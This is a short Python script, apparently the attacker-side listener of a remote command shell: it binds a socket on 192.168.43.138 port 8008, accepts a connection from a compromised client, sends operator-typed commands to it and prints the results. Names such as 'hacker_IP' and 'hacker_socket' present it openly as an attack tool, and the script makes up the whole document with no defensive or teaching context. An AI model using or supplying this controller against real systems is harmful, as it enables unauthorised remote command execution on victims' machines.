import socket

hacker_IP = '192.168.43.138'
hacker_PORT = 8008

hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_address = (hacker_IP,hacker_PORT)
hacker_socket.bind(socket_address)
hacker_socket.listen(5)
hacker_socket, client_address = hacker_socket.accept()

try:
    while True:
        command = input("Enter the command you want to Run: ")
        hacker_socket.send(command.encode())
        if command == "stop":
            break
        recv_message = hacker_socket.recv(1024)
        print(recv_message.decode())
except Exception:
    print("Exception occured")

hacker_socket.close()